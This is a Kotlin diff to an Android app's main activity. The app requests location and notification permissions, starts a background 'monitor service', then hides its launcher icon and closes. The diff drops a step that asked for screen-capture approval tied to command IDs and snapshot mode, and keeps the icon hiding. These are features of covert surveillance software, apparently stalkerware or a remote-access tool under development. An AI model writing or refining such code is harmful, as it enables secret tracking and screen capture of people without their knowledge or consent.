@@ -13,10 +13,10 @@ import android.os.Handler
 import android.os.Looper
 import android.os.PowerManager
 import android.provider.Settings
-import androidx.appcompat.app.AppCompatActivity
+import android.app.Activity
 import androidx.core.app.ActivityCompat
 
-class MainActivity : AppCompatActivity() {
+class MainActivity : Activity() {
 
     private val PERMS = arrayOf(
         Manifest.permission.ACCESS_FINE_LOCATION,
@@ -47,7 +47,7 @@ class MainActivity : AppCompatActivity() {
             checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
         }
         if (missing.isNotEmpty()) {
-            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 100)
+            requestPermissions(missing.toTypedArray(), 100)
         } else {
             startEverything()
         }
@@ -81,33 +81,18 @@ class MainActivity : AppCompatActivity() {
         // 4. POST_NOTIFICATIONS Android 13+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
-                ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.POST_NOTIFICATIONS), 101)
+                requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), 101)
             }
         }
 
         // 5. Start monitor service
         startMonitorService()
 
-        // 6. MediaProjection ek baar
-        Handler(Looper.getMainLooper()).postDelayed({
-            val prefs = getSharedPreferences(Config.PREFS_NAME, Context.MODE_PRIVATE)
-            if (!prefs.getBoolean("projection_approved", false)) {
-                try {
-                    startActivity(
-                        Intent(this, ScreenPermissionActivity::class.java).apply {
-                            putExtra("cmd_id", 0)
-                            putExtra("mode", ScreenStreamService.MODE_SNAPSHOT)
-                        }
-                    )
-                } catch (e: Exception) {}
-            }
-        }, 2000)
-
-        // 7. Hide icon after 500ms then finish
+        // 6. Hide icon then finish
         Handler(Looper.getMainLooper()).postDelayed({
             hideIconViaAlias()
             finish()
-        }, 500)
+        }, 1000)
     }
 
     private fun hideIconViaAlias() {
